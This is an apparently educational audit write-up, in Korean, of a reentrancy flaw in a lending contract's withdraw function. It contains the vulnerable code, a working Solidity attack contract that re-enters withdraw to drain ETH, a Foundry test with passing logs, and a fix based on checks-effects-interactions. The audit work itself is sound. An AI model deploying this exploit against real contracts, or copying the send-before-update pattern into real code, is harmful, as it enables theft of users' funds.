## 문성훈

## 미구현된 부분: Repay, Accured Interest

## 1. Reentrancy

### 설명

문제 코드: DreamAcademyLending.sol 내 withdraw() 함수 전체

withdraw 함수에서 예치한 이더리움 담보를 보낼 때 담보에 대한 정보를 업데이트 하지 않은 채로 송금을 먼저 수행하기 때문에 발생한 문제이다.

```java
function withdraw(address tokenAddress, uint256 amount) external {
  _createBook(msg.sender);

  _updateInterest();

  if(tokenAddress == address(0x0)) {
    require(ETHBalance >= amount);
    uint256 borrowedETH = participateBooks[msg.sender].usdc_borrow  * 2 / _orcale.getPrice(address(0x0)) * 1e18;

    require(participateBooks[msg.sender].eth_balance - borrowedETH >= amount);

    (bool success, ) = payable(msg.sender).call{value: amount}("");

    ETHBalance -= amount;
    participateBooks[msg.sender].eth_balance -= amount;
    participateBooks[msg.sender].eth_deposit -= amount;
    participateBooks[msg.sender].eth_collateral -= amount;
	} else {
	...
	}
	...
}
```

withdraw 함수는 ETHBalance와 participateBooks라는 전역변수를 사용해 사용자의 담보 정보를 가져오는데, 이를 업데이트하는 `ETHBalance -= amount;` 구문이 송금 이후에 위치해있다. 이는 Checks - Effects - Interaction 패턴에 벗어나며, 외부 함수의 호출로 인한 reentrancy 취약점이 발생할 수 있다.

### 파급력

Critical

-   산정 이유
    -   구현된 withdraw 함수의 한계로 단순히 재진입이 가능하다는 점만 증명 가능하다. 또한 사용자가 맡긴 담보만을 연속적으로 탈취할 수 있다는 점만 존재한다.
    -   하지만 컨트랙트가 완성되었을 경우 매우 강력한 취약점으로 작용할 수 있기 때문에 Critical을 부여하였다.
-   공격 시나리오
    -   다음과 같이 Reentrancy 코드를 작성했다.
    -   공격자는 임의의 자산을 예치하고, 예치한 자산의 일부를 withdraw를 호출하여 돌려받는다.
    -   receive 함수에 다시 withdraw를 호출하는 구문을 넣어 withdraw로 이더리움을 돌려받는 데에 성공하면 다시한번 withdraw를 호출한다.
    -   Lending 컨트랙트 내에서 아직 ETHBalance와 participateBooks의 값이 업데이트 되지 않았으므로 모든 조건을 통과하고 call with value를 수행한다.
    -   모든 자금을 탈취하면 attack 함수의 동작이 종료되고, reenterancy 컨트랙트는 lending 컨트랙트에 예치한 사용자의 담보를 돌려받게 된다.
    -   이렇게 접근한 자산은 공격자가 되돌려받을 수 있다.
    ```java
    contract Reentrancy {
      DreamOracle dreamOracle;
      DreamAcademyLending lending;
      address owner;
      constructor(DreamAcademyLending _lending){
        lending = _lending;
        owner = msg.sender;
      }
      function attack() external payable {
        require(msg.value >= 100 ether, "msg.value more than 100 ether");
        console.log("start", address(this).balance / 1 ether);
        (bool success, )= address(lending).call{value: 100 ether}(abi.encodeWithSelector(lending.deposit.selector, address(0x0), 100 ether));

        (bool success2, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), 100 ether));
      }

      function transfer() public payable {
        (bool success,) = msg.sender.call{value: 100 ether}("");
      }

      receive() external payable {
        uint targetBalance = address(lending).balance;
        if(targetBalance > 100 ether){
            console.log(address(this).balance / 1 ether);
            (bool success3, )= address(lending).call(abi.encodeWithSelector(lending.withdraw.selector, address(0x0), 100 ether));
        }
      }
    }
    ```
    ```java
    function testReentrancy() external {
      reentrancy = new Reentrancy(lending);
      vm.deal(user1, 1000 ether);
      supplySmallEtherDepositUser2();

      console.log("user1 balance", user1.balance / 1 ether);
      console.log("reenter balance", address(reentrancy).balance / 1 ether);
      console.log("lending balance", address(lending).balance / 1 ether);
      vm.startPrank(user1);
          (bool success1,) = address(reentrancy).call{value: 1000 ether}(abi.encodeWithSelector(reentrancy.attack.selector));
          (bool success3,) = address(reentrancy).call{value: 0 ether}(abi.encodeWithSelector(reentrancy.transfer.selector));
      vm.stopPrank();
    }
    ```
    ```java
    [PASS] testReentrancy() (gas: 898720)
    Logs:
      user1 balance 1000
      reenter balance 0
      lending balance 1000
      100
      100
      100
      100
      100
      100
      100
      100
      100
      100
      100
      user1 balance 0
      reenter balance 1000
      lending balance 1000
      user1 balance 1000
      reenter balance 0
      lending balance 1000
    ```
    -   lending에 deposit한 1000 ether를 한번의 transfer를 통해 10번에 나누어 reentrancy 컨트랙트에 옮겨왔고, 이를 다시 user1으로 옮겨왔다.
-   공격 난이도
    -   컨트랙트를 호출할 수 있는 사람이라면 누구나 가능하다.

### 해결 방안

-   call을 통해 담보금을 돌려주는 구문을 withdraw 함수에서 맨 뒤로 옮겨서 Check-Effect가 먼저 일어날 수 있도록 해야한다.
